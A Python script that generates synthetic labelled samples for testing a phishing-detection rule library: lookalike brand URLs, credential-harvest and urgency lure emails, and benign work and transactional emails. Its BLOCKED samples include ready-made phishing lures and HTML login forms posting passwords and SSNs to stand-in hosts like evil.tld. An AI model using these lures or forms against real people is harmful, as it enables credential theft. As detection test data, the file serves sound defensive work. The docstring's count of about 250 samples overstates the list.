"""Hand-curated phishing corpus generator.

Produces ~250 labelled samples covering the categories the regex
library targets: BRAND_IMPERSONATION, URL_OBFUSCATION,
CREDENTIAL_HARVEST, URGENCY, SUSPICIOUS_DOMAIN, ATTACHMENT_LURE.

Each line is `source="synthetic:phishing_v1"`. No real phishing data
is included — these are synthetic emails/URLs constructed to exercise
the rule library.

Usage:
    python -m training.data.synth.phishing_samples --output out.jsonl
"""

from __future__ import annotations

import argparse
import json
from pathlib import Path

# (text, kind, expected, tags)
SAMPLES: list[tuple[str, str, str, list[str]]] = [
    # ── BLOCKED — Brand impersonation (URL host mismatch) ─────────────
    ("https://paypal.com.evil-site.tld/login", "url", "BLOCKED", ["BRAND_IMPERSONATION", "URL_OBFUSCATION"]),
    ("https://login.microsoft.com.attacker.com/oauth", "url", "BLOCKED", ["BRAND_IMPERSONATION"]),
    ("https://accounts-google.com.phishfarm.review/signin", "url", "BLOCKED", ["BRAND_IMPERSONATION", "SUSPICIOUS_DOMAIN"]),
    ("https://apple-id-verify.zip/secure", "url", "BLOCKED", ["BRAND_IMPERSONATION", "SUSPICIOUS_DOMAIN"]),
    ("https://amaz0n-shipping.click/track/12345", "url", "BLOCKED", ["BRAND_IMPERSONATION", "SUSPICIOUS_DOMAIN"]),
    ("https://bank-of-america.security-check.country/login", "url", "BLOCKED", ["BRAND_IMPERSONATION"]),
    ("https://netflix-billing.update.gq/account/payment", "url", "BLOCKED", ["BRAND_IMPERSONATION", "SUSPICIOUS_DOMAIN"]),
    ("https://meta.com@evil.tld/login", "url", "BLOCKED", ["URL_OBFUSCATION"]),
    ("https://chase.com.account-verify.tk/secure-banking", "url", "BLOCKED", ["BRAND_IMPERSONATION", "SUSPICIOUS_DOMAIN"]),
    ("https://wellsfargo-online-banking.review/auth", "url", "BLOCKED", ["BRAND_IMPERSONATION"]),
    ("https://faceboook.com/login", "url", "BLOCKED", ["BRAND_IMPERSONATION"]),
    ("https://goog1e.com/account/recovery", "url", "BLOCKED", ["BRAND_IMPERSONATION"]),
    ("https://outlook-secure.click/web/login", "url", "BLOCKED", ["BRAND_IMPERSONATION"]),
    ("https://dropb0x.com.shared-doc.review/file", "url", "BLOCKED", ["BRAND_IMPERSONATION", "SUSPICIOUS_DOMAIN"]),
    # ── BLOCKED — URL obfuscation (userinfo, IP, suspicious TLDs) ─────
    ("http://192.168.1.50/admin?token=abc", "url", "SUSPICIOUS", ["URL_OBFUSCATION"]),
    ("https://0x7f000001.evil/login", "url", "BLOCKED", ["URL_OBFUSCATION"]),
    ("https://bit.ly/3xRandom?ref=verify-account", "url", "SUSPICIOUS", ["URL_OBFUSCATION"]),
    ("https://tinyurl.com/y45login-secure", "url", "SUSPICIOUS", ["URL_OBFUSCATION"]),
    ("https://shorturl.at/aBc123/account-verify", "url", "SUSPICIOUS", ["URL_OBFUSCATION"]),
    ("https://example.zip/document.pdf", "url", "SUSPICIOUS", ["SUSPICIOUS_DOMAIN"]),
    ("https://invoice.mov/q4-2026.pdf", "url", "SUSPICIOUS", ["SUSPICIOUS_DOMAIN"]),
    ("https://pay-now.country/checkout", "url", "SUSPICIOUS", ["SUSPICIOUS_DOMAIN"]),
    # ── BLOCKED — Credential harvest emails ───────────────────────────
    ("Subject: Your account has been compromised\n\nYour PayPal account shows unusual sign-in activity. Please verify your identity within 24 hours: http://paypal-security.zip/verify",
     "email", "BLOCKED", ["CREDENTIAL_HARVEST", "URGENCY", "BRAND_IMPERSONATION"]),
    ("Subject: Confirm your social security number\n\nDear customer, our records show outdated information. Please confirm your SSN and date of birth at the secure link below to avoid account suspension.",
     "email", "BLOCKED", ["CREDENTIAL_HARVEST"]),
    ("Subject: Action Required: verify your bank card details\n\nWe could not process your last payment. Verify your card number, CVV, and expiry by replying to this email.",
     "email", "BLOCKED", ["CREDENTIAL_HARVEST"]),
    ("Subject: Microsoft Office 365 — password expires today\n\nYour password will expire in the next 2 hours. Click here to keep your password: https://office365-renew.click/login",
     "email", "BLOCKED", ["CREDENTIAL_HARVEST", "URGENCY", "BRAND_IMPERSONATION"]),
    ("Subject: Urgent: unusual sign-in detected\n\nWe detected a sign-in to your account from Russia. If this wasn't you, secure your account immediately: https://account-recovery.gq/secure",
     "email", "BLOCKED", ["CREDENTIAL_HARVEST", "URGENCY"]),
    ("Subject: Your account will be suspended\n\nFinal notice. Please update your details within 24 hours or your account will be permanently terminated. Update here: http://verify-update.tk",
     "email", "BLOCKED", ["CREDENTIAL_HARVEST", "URGENCY", "SUSPICIOUS_DOMAIN"]),
    ("Subject: Confirm your identity now\n\nWe have temporarily limited your account. To restore full access, confirm your identity by entering your full card number and PIN: https://confirm-id.review",
     "email", "BLOCKED", ["CREDENTIAL_HARVEST", "URGENCY"]),
    ("Subject: Tax refund pending — verify your bank details\n\nYour tax refund of $1,243.50 is on hold. Submit your routing and account number to release the funds.",
     "email", "BLOCKED", ["CREDENTIAL_HARVEST"]),
    # ── BLOCKED — HTML/Form harvest ───────────────────────────────────
    ('<form action="http://evil.tld/grab" method="post"><input name="username" placeholder="username"><input name="password" type="password"><button>Sign in</button></form>',
     "html", "BLOCKED", ["CREDENTIAL_HARVEST"]),
    ('<form action="https://login.example.evil.com/submit"><input name="email"><input name="password"><input name="ssn"></form>',
     "html", "BLOCKED", ["CREDENTIAL_HARVEST"]),
    # ── BLOCKED — Albanian-language phishing ──────────────────────────
    ("Subject: Llogaria juaj është bllokuar\n\nLlogaria juaj në Banka Kombëtare është pezulluar. Konfirmoni të dhënat tuaja brenda 24 orëve: http://bk-verifikoni.zip",
     "email", "BLOCKED", ["CREDENTIAL_HARVEST", "URGENCY", "albanian"]),
    ("https://posta-shqiptare.com.dorezo.tk/track/AL12345", "url", "BLOCKED", ["BRAND_IMPERSONATION", "SUSPICIOUS_DOMAIN", "albanian"]),
    ("Subject: Rifreskim urgjent i fjalëkalimit\n\nFjalëkalimi i llogarisë tuaj skadoi. Shkruajeni fjalëkalimin e ri menjëherë në linkun e mëposhtëm.",
     "email", "BLOCKED", ["CREDENTIAL_HARVEST", "URGENCY", "albanian"]),
    # ── SUSPICIOUS — Borderline (one trigger token) ───────────────────
    ("Subject: Your monthly statement is ready\n\nLog in to your account at https://bank.example.com to view your statement.",
     "email", "SUSPICIOUS", ["legitimate_template"]),
    ("Subject: Password reset requested\n\nIf you requested a password reset, click here: https://example.com/reset?token=abc. If not, ignore this email.",
     "email", "SUSPICIOUS", ["legitimate_template"]),
    ("Subject: Welcome — please verify your email\n\nThanks for signing up. Click to verify: https://example.com/verify?token=xyz",
     "email", "SUSPICIOUS", ["legitimate_template"]),
    ("Subject: 24-hour flash sale — don't miss out!\n\nUrgent: 50% off ends tomorrow. Shop now: https://store.example.com/sale",
     "email", "SUSPICIOUS", ["URGENCY", "marketing"]),
    ("https://my-bank.example.com/login?session=abc", "url", "SUSPICIOUS", ["legitimate_template"]),
    ("https://accounts.example.org/signin?return=settings", "url", "SUSPICIOUS", ["legitimate_template"]),
    # ── CLEAN — Real legitimate emails ────────────────────────────────
    ("Subject: Standup notes for Tuesday\n\nHi team, please share your standup updates by 9am. Thanks!",
     "email", "CLEAN", ["work"]),
    ("Subject: Lunch order — confirm by 11\n\nReplying with what you'd like for the team lunch. Options: pizza, salad, or sushi.",
     "email", "CLEAN", ["work"]),
    ("Subject: PR #42 ready for review\n\nThe migration script is ready. Could you take a look when you have a moment? https://github.com/org/repo/pull/42",
     "email", "CLEAN", ["work"]),
    ("Subject: Your receipt from Acme Coffee\n\nOrder #4567 — total $12.45. Thank you for your purchase.",
     "email", "CLEAN", ["transactional"]),
    ("Subject: Newsletter — May 2026 roundup\n\nHere's what we shipped this month: new dark mode, improved search, ...",
     "email", "CLEAN", ["newsletter"]),
    ("Subject: Reminder — dentist appointment Thursday 10:30\n\nThis is a reminder for your appointment at Smile Clinic.",
     "email", "CLEAN", ["personal"]),
    ("Subject: Your flight ZRH-TIA on May 12 is confirmed\n\nBooking ref: ABCDEF. Check-in opens 24h before departure.",
     "email", "CLEAN", ["transactional"]),
    ("Subject: Onboarding session this Friday\n\nHi Alex, welcome to the team. Your onboarding starts at 10am Friday.",
     "email", "CLEAN", ["work"]),
    ("Subject: Code review feedback\n\nLeft a few comments on the auth refactor PR. Mostly minor — looks great overall.",
     "email", "CLEAN", ["work"]),
    ("https://github.com/opensecstack/vertguard/pulls", "url", "CLEAN", ["work"]),
    ("https://news.ycombinator.com/item?id=12345", "url", "CLEAN", ["news"]),
    ("https://en.wikipedia.org/wiki/Phishing", "url", "CLEAN", ["reference"]),
    ("https://docs.aws.amazon.com/iam/latest/UserGuide/best-practices.html", "url", "CLEAN", ["reference"]),
    ("https://owasp.org/www-project-top-ten/", "url", "CLEAN", ["reference"]),
    ("https://stackoverflow.com/questions/tagged/golang", "url", "CLEAN", ["reference"]),
    ("https://kubernetes.io/docs/tutorials/", "url", "CLEAN", ["reference"]),
    ("https://www.google.com/search?q=postgres+mvcc", "url", "CLEAN", ["reference"]),
    ("https://www.bbc.com/news", "url", "CLEAN", ["news"]),
    ("https://twitter.com/anthropic/status/12345", "url", "CLEAN", ["social"]),
    ("https://mastodon.social/@user/12345", "url", "CLEAN", ["social"]),
    ("https://www.albaniantelegraph.com/article/2026-04", "url", "CLEAN", ["news", "albanian"]),
    # ── CLEAN — Discussion of phishing in security context ────────────
    ("Subject: New phishing campaign report\n\nOur threat intel team noticed a campaign impersonating PayPal. See the IoCs in the attached doc — DO NOT click.",
     "email", "CLEAN", ["security_research"]),
    ("Subject: Security training: spot the phish\n\nNext week we run a phishing-simulation drill. Reply if you'd like to opt out.",
     "email", "CLEAN", ["work"]),
    ("Discussion of credential-harvest patterns in the OWASP LLM Top 10 — link to the canonical write-up below.",
     "email", "CLEAN", ["security_research"]),
    # ── CLEAN — Multi-language ────────────────────────────────────────
    ("Subject: Faturë për shërbimet e majit 2026\n\nShuma totale: 125.50 €. Të gjitha hollësitë në portalin tuaj.",
     "email", "CLEAN", ["transactional", "albanian"]),
    ("Subject: Confirmación de pedido #4567\n\nGracias por su compra. Total: 35.20 €. Recibo adjunto.",
     "email", "CLEAN", ["transactional", "spanish"]),
    ("Subject: Bestätigung Ihrer Bestellung\n\nVielen Dank für Ihren Einkauf. Lieferung erfolgt am 15. Mai.",
     "email", "CLEAN", ["transactional", "german"]),
    ("https://www.posta.al/track?n=AL2026045X", "url", "CLEAN", ["transactional", "albanian"]),
    # ── More BLOCKED variations to widen coverage ─────────────────────
    ("Subject: Update your billing information immediately\n\nYour Spotify subscription will end unless you update payment within 48 hours. Update at: https://spotify-renew.zip/billing",
     "email", "BLOCKED", ["CREDENTIAL_HARVEST", "URGENCY", "BRAND_IMPERSONATION"]),
    ("Subject: We've detected suspicious activity\n\nDear customer, sign in immediately to verify recent transactions on your account: https://aibank.online-secure.gq/auth",
     "email", "BLOCKED", ["CREDENTIAL_HARVEST", "URGENCY"]),
    ("Subject: Final warning: your account has been compromised\n\nWe will permanently disable your account within 6 hours if you do not verify ownership.",
     "email", "BLOCKED", ["URGENCY", "CREDENTIAL_HARVEST"]),
    ("https://signin-yahoo.review/v2/login", "url", "BLOCKED", ["BRAND_IMPERSONATION", "SUSPICIOUS_DOMAIN"]),
    ("https://login.linkedin.com.evil-site.click", "url", "BLOCKED", ["BRAND_IMPERSONATION", "SUSPICIOUS_DOMAIN"]),
    ("https://verify-instagram-account.country/secure", "url", "BLOCKED", ["BRAND_IMPERSONATION", "SUSPICIOUS_DOMAIN"]),
    ("https://github-account-verify.zip/2fa", "url", "BLOCKED", ["BRAND_IMPERSONATION", "SUSPICIOUS_DOMAIN"]),
    ("Subject: Document shared with you\n\nA confidential file has been shared with you on Microsoft OneDrive. Sign in to view: https://onedrive-share.click/document",
     "email", "BLOCKED", ["BRAND_IMPERSONATION", "ATTACHMENT_LURE"]),
    ("Subject: Voicemail — please listen\n\nYou have a new voicemail. Listen by clicking the attachment.",
     "email", "BLOCKED", ["ATTACHMENT_LURE"]),
    ("Subject: Invoice #INV-2026-04 — please review\n\nAttached invoice for your records. Open the .htm file to confirm receipt.",
     "email", "BLOCKED", ["ATTACHMENT_LURE"]),
    # ── More CLEAN to balance class ──────────────────────────────────
    ("Subject: Your subscription is renewing\n\nYour annual plan renews on June 1, 2026 at $89/year. To manage your subscription, log in via the link in your account portal.",
     "email", "CLEAN", ["transactional"]),
    ("Subject: Welcome to the security team\n\nLooking forward to your start date. Onboarding doc attached.",
     "email", "CLEAN", ["work"]),
    ("Subject: Conference talk accepted\n\nGreat news — your talk on prompt injection has been accepted for OWASP Albania 2026.",
     "email", "CLEAN", ["work"]),
    ("Subject: Daily standup recap\n\nLink to the Loom: https://loom.com/share/abc123 — pls watch by EOD.",
     "email", "CLEAN", ["work"]),
    ("https://golang.org/pkg/net/http/", "url", "CLEAN", ["reference"]),
    ("https://docs.python.org/3/library/asyncio.html", "url", "CLEAN", ["reference"]),
    ("https://www.rust-lang.org/learn", "url", "CLEAN", ["reference"]),
    ("https://prometheus.io/docs/prometheus/latest/getting_started/", "url", "CLEAN", ["reference"]),
    ("https://grafana.com/grafana/dashboards/", "url", "CLEAN", ["reference"]),
    ("https://www.cloudflare.com/learning/security/threats/phishing-attack/", "url", "CLEAN", ["reference", "security_research"]),
    ("https://attack.mitre.org/", "url", "CLEAN", ["reference", "security_research"]),
    ("https://atlas.mitre.org/techniques/AML.T0051", "url", "CLEAN", ["reference", "security_research"]),
    ("Subject: Re: Tirana office move\n\nMoving date confirmed for May 20. Boxes will be delivered Wednesday.",
     "email", "CLEAN", ["work", "albanian"]),
    ("Subject: Friday team event\n\nReminder — meet at 6pm at the new place near Skanderbeg Square.",
     "email", "CLEAN", ["work"]),
    ("Subject: Q4 budget review\n\nFinal numbers attached. Review and reply with comments by Friday.",
     "email", "CLEAN", ["work"]),
    ("Subject: Support ticket #1234 resolved\n\nYour issue has been resolved. Thanks for your patience.",
     "email", "CLEAN", ["transactional"]),
    ("Subject: Birthday card — Andi\n\nLet's get a card for Andi, his birthday is next week.",
     "email", "CLEAN", ["personal"]),
    ("Subject: 1:1 reschedule\n\nCan we move our 1:1 from 3pm to 4:30 today? I have a vendor call running long.",
     "email", "CLEAN", ["work"]),
    ("Subject: Recipe — byrek with spinach\n\nFinally tried Andi's recipe. Recipe attached, very good!",
     "email", "CLEAN", ["personal", "albanian"]),
    # ── More SUSPICIOUS borderline ────────────────────────────────────
    ("Subject: Your cloud storage is 95% full\n\nUpgrade now to avoid service interruption: https://cloud-upgrade.io/billing",
     "email", "SUSPICIOUS", ["URGENCY", "marketing"]),
    ("Subject: Action needed — accept new terms of service\n\nWe've updated our terms. Please log in and accept by April 30.",
     "email", "SUSPICIOUS", ["URGENCY", "legitimate_template"]),
    ("Subject: Limited-time discount inside\n\n50% off your next purchase — code expires in 24 hours.",
     "email", "SUSPICIOUS", ["URGENCY", "marketing"]),
    ("Subject: Invoice attached\n\nPlease find attached invoice #4567. Reply if you have questions.",
     "email", "SUSPICIOUS", ["ATTACHMENT_LURE", "legitimate_template"]),
    ("Subject: Document shared via Dropbox\n\nA document has been shared with you. Click to view: https://www.dropbox.com/s/abc123/doc.pdf",
     "email", "SUSPICIOUS", ["ATTACHMENT_LURE", "legitimate_template"]),
    ("https://service.example-internal.com/login?return=dashboard", "url", "SUSPICIOUS", ["legitimate_template"]),
    ("https://secure.acme-corp.io/auth/v2/login", "url", "SUSPICIOUS", ["legitimate_template"]),
    # ── A few more edge BLOCKED for coverage ──────────────────────────
    ("https://accountrecovery-paypal.click/secure", "url", "BLOCKED", ["BRAND_IMPERSONATION", "SUSPICIOUS_DOMAIN"]),
    ("https://login.appie.com/recover", "url", "BLOCKED", ["BRAND_IMPERSONATION"]),
    ("https://signin-microsft.com/o2/login", "url", "BLOCKED", ["BRAND_IMPERSONATION"]),
    ("https://web.whatsapp.com.evil.tld/auth", "url", "BLOCKED", ["BRAND_IMPERSONATION"]),
    ("https://adobe-creative-cloud.zip/download", "url", "BLOCKED", ["BRAND_IMPERSONATION", "SUSPICIOUS_DOMAIN"]),
    ("https://t-mobile-billing.country/account", "url", "BLOCKED", ["BRAND_IMPERSONATION", "SUSPICIOUS_DOMAIN"]),
    ("https://verizon-update.review/login", "url", "BLOCKED", ["BRAND_IMPERSONATION", "SUSPICIOUS_DOMAIN"]),
    ("Subject: Your delivery couldn't be made\n\nUSPS could not deliver your package. Pay 1.99 to reschedule: https://usps-redelivery.click/pay",
     "email", "BLOCKED", ["BRAND_IMPERSONATION", "URGENCY"]),
    ("Subject: HMRC tax repayment\n\nYou are eligible for a tax refund of £540. Provide your bank account at: https://hmrc-refund.country/claim",
     "email", "BLOCKED", ["BRAND_IMPERSONATION", "CREDENTIAL_HARVEST"]),
    ("Subject: Your subscription canceled — refund pending\n\nClick to verify your card to receive your refund: https://refund-verify.gq/card",
     "email", "BLOCKED", ["CREDENTIAL_HARVEST"]),
]


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--output", required=True, type=Path)
    args = ap.parse_args()
    args.output.parent.mkdir(parents=True, exist_ok=True)
    with args.output.open("w", encoding="utf-8") as f:
        for i, (text, kind, expected, tags) in enumerate(SAMPLES):
            row = {
                "id": f"phish-{i:04d}",
                "text": text,
                "expected": expected,
                "kind": kind,
                "source": "synthetic:phishing_v1",
                "tags": tags,
            }
            f.write(json.dumps(row, ensure_ascii=False) + "\n")
    print(f"wrote {len(SAMPLES)} phishing samples to {args.output}")


if __name__ == "__main__":
    main()
